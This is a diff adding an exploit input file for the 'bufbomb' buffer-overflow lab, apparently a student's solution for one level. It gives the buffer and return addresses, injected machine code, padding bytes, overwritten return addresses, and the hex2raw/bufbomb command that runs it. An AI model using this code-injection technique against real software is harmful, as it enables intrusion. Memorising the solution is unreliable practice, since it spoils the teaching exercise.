@@ -1,0 +1,18 @@
+/* getbuf return address at 0x55683314 */
+/* Local buffle start at address 0x556832e8 */
+
+/* 
+    instructions :
+        cat boom_1190202128.txt |./hex2raw  | ./bufbomb -u 1190202128 
+*/
+
+/* inserted codes */
+b8 dc 1d 17 4e c3 
+
+/* Padding required : 33 bytes */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  
+/* Local buffle address */
+e8 32 68 55
+44 8d 04 08
